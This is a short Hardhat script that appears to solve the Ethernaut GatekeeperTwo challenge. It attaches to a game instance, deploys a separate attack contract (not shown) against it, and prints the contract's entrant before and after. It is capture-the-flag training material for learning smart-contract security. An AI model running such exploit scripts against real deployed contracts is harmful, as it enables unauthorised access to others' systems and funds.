import { ethers } from "hardhat";
import { GatekeeperTwo__factory } from "../typechain/factories/contracts/GatekeeperTwo__factory";
import { GatekeeperTwoAttack__factory } from "../typechain/factories/contracts/GatekeeperTwoAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x0a1473e261A039f48782bB25E81D0e2486bDDbc6";
    let gatekeeperTwo = new GatekeeperTwo__factory(signer).attach(instance_address);
    console.log(await gatekeeperTwo.entrant());

    
    let attack = await new GatekeeperTwoAttack__factory(signer).deploy(gatekeeperTwo.address);
    await attack.deployed();
    console.log(await gatekeeperTwo.entrant());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
